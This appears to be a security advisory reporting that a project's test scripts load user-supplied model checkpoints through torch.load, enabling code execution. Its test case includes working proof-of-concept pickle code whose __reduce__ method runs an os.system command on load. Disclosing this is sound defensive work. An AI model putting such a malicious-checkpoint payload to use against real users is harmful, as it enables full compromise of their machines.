### Vulnerability List

- Vulnerability Name: Malicious Checkpoint Loading leading to Arbitrary Code Execution
- Description:
    1. An attacker crafts a malicious model checkpoint file. This file, when loaded, is designed to execute arbitrary Python code on the victim's machine.
    2. The attacker convinces a user to download and use this malicious checkpoint file. This could be done through social engineering, by hosting the file on a seemingly legitimate website, or by compromising a distribution channel.
    3. The user, intending to test or use the multi-token completion models, uses the testing scripts (`test.py` or `matrix_plugin.py`).
    4. The user provides the path to the malicious checkpoint file via the `--ckpt` argument when running the testing script.
    5. The testing script uses `pytorch-lightning`'s checkpoint loading mechanism (specifically `Generation.load_from_checkpoint` or `MatrixDecoder.load_from_checkpoint`).
    6. `pytorch-lightning`, which internally uses `torch.load`, deserializes the malicious checkpoint file.
    7. During deserialization, the malicious code embedded in the checkpoint is executed, potentially granting the attacker control over the user's system.
- Impact: Arbitrary code execution on the user's machine. This can lead to:
    - Data exfiltration: Sensitive data, including credentials, personal files, or project-related information, can be stolen.
    - System compromise: The attacker can gain full control of the user's machine, install malware, create backdoors, or use the machine as part of a botnet.
    - Data corruption or deletion: Critical system files or user data can be modified or deleted.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None. The project relies on the user to provide trustworthy checkpoints. There is a mention of security issue notifications in `CONTRIBUTING.md`, but this is a reactive measure, not a proactive mitigation.
- Missing Mitigations:
    - Checkpoint origin verification: Implement mechanisms to verify the origin and integrity of the checkpoint files. This could involve:
        - Digital signatures: Checkpoint files could be signed by a trusted authority, and the software could verify these signatures before loading.
        - Checksum verification: Provide checksums (like SHA256) for official checkpoint files and verify them before loading.
    - Secure checkpoint loading: Explore safer alternatives to `torch.load` if available, or sanitize/inspect the checkpoint file before loading. However, completely preventing deserialization exploits with `torch.load` is very challenging.
    - User warnings: Display clear warnings to users when loading checkpoints from untrusted sources, emphasizing the security risks.
    - Documentation: Clearly document the risks of loading untrusted checkpoints and recommend best practices for obtaining and verifying checkpoints.
- Preconditions:
    - The user must download and attempt to load a malicious checkpoint file.
    - The user must execute one of the testing scripts (`test.py` or `matrix_plugin.py`) and provide the path to the malicious checkpoint using the `--ckpt` argument.
- Source Code Analysis:
    - **`test.py`**:
        ```python
        from predict import generate, Generation, get_ckpt_version, get_latest_ckpt
        # ...
        if __name__ == '__main__':
            parser = argparse.ArgumentParser()
            parser.add_argument('-c', '--ckpt', type=str) # Checkpoint path argument
            # ...
            args = parser.parse_args()
            ckpt = args.ckpt # ckpt variable gets value from command line argument
            # ...
            model = Generation.load_from_checkpoint(ckpt).cuda() # Vulnerable checkpoint loading
        ```
        The `test.py` script uses `argparse` to accept the checkpoint path via the `-c` or `--ckpt` argument. The value is directly passed to `Generation.load_from_checkpoint(ckpt)`.

    - **`matrix_plugin.py`**:
        ```python
        from matrix_plugin import MatrixDecoder
        # ...
        if __name__ == '__main__':
            parser = argparse.ArgumentParser()
            parser.add_argument('--ckpt', type=str, default=None) # Checkpoint path argument
            # ...
            args = parser.parse_args()
            ckpt = args.ckpt # ckpt variable gets value from command line argument
            # ...
            test_model = MatrixDecoder.load_from_checkpoint(ckpt_path, model=matrix).cuda().eval() # Vulnerable checkpoint loading
        ```
        Similarly, `matrix_plugin.py` also uses `argparse` to take the checkpoint path via `--ckpt` and loads it using `MatrixDecoder.load_from_checkpoint(ckpt_path, model=matrix)`.

    - **`generation.py` and `mtc_model.py`**:
        - `generation.py` defines the `Generation` class which inherits from `Seq2Seq` and `GenerationMixin`. `GenerationMixin` is from `transformers` and integrates with `pytorch-lightning` for checkpoint loading.
        - `mtc_model.py` defines the `Seq2Seq` model, which is a `pytorch-lightning` `LightningModule`.
        - `pytorch-lightning`'s `load_from_checkpoint` function, used in both `test.py` and `matrix_plugin.py`, relies on `torch.load` to deserialize the checkpoint file. `torch.load` is known to be vulnerable to arbitrary code execution when loading untrusted data because it can deserialize arbitrary Python objects, including those that can execute code upon loading.

    - **Visualization**:

    ```mermaid
    graph LR
        A[User executes test.py/matrix_plugin.py with --ckpt] --> B(Parses --ckpt argument);
        B --> C{Generation.load_from_checkpoint/MatrixDecoder.load_from_checkpoint};
        C --> D[pytorch-lightning load_checkpoint];
        D --> E[torch.load(ckpt_path)];
        E --> F{Malicious Checkpoint File};
        F -- Deserialization & Code Execution --> G(Arbitrary Code Execution on User Machine);
    ```

- Security Test Case:
    1. **Attacker setup**:
        - Create a malicious Python class that executes code upon deserialization (e.g., in its `__reduce__` method).
        - Create a simple `pytorch-lightning` model (can be a dummy model).
        - Create a checkpoint file using `pytorch-lightning`'s saving mechanism, but replace the model state with an instance of the malicious class. Alternatively, directly craft a pickle file that executes code. A simple example of malicious checkpoint `malicious_ckpt.ckpt`:
            ```python
            import torch
            import pickle

            class Malicious(object):
                def __reduce__(self):
                    import os
                    return (os.system, ('touch /tmp/pwned',)) # Executes 'touch /tmp/pwned' on load

            malicious_data = {'state_dict': {'model': Malicious()}} # In real exploit, replace actual model state
            torch.save(malicious_data, 'malicious_ckpt.ckpt')

            # Alternative using pickle directly (less realistic for this project but simpler to demonstrate)
            import pickle, os
            class EvilPickle(object):
                def __reduce__(self):
                    return (os.system, ('touch /tmp/pwned',))
            pickle.dumps(EvilPickle())
            with open("malicious_ckpt_pickle.ckpt", "wb") as f:
                pickle.dump(EvilPickle(), f)
            ```
        - Host this `malicious_ckpt.ckpt` file on a publicly accessible server or simulate its distribution.
    2. **Victim setup**:
        - Clone the vulnerable project repository.
        - Install the requirements (`pip install -r requirements.txt`).
    3. **Execution**:
        - Victim downloads the `malicious_ckpt.ckpt` from the attacker's server (or uses the locally crafted `malicious_ckpt.ckpt` or `malicious_ckpt_pickle.ckpt`).
        - Victim executes the testing script, providing the path to the malicious checkpoint:
            ```bash
            python test.py --ckpt /path/to/malicious_ckpt.ckpt
            # or
            python matrix_plugin.py --ckpt /path/to/malicious_ckpt.ckpt
            # or for pickle only example
            python predict.py --ckpt /path/to/malicious_ckpt_pickle.ckpt # if predict.py was modified to load ckpt directly
            ```
    4. **Verification**:
        - After running the command, check if the `/tmp/pwned` file exists on the victim's system. If it exists, it confirms that the code within the malicious checkpoint was executed, demonstrating arbitrary code execution.

This vulnerability allows for complete compromise of the user's machine if they load a malicious checkpoint. Mitigation is critical to prevent this severe security risk.
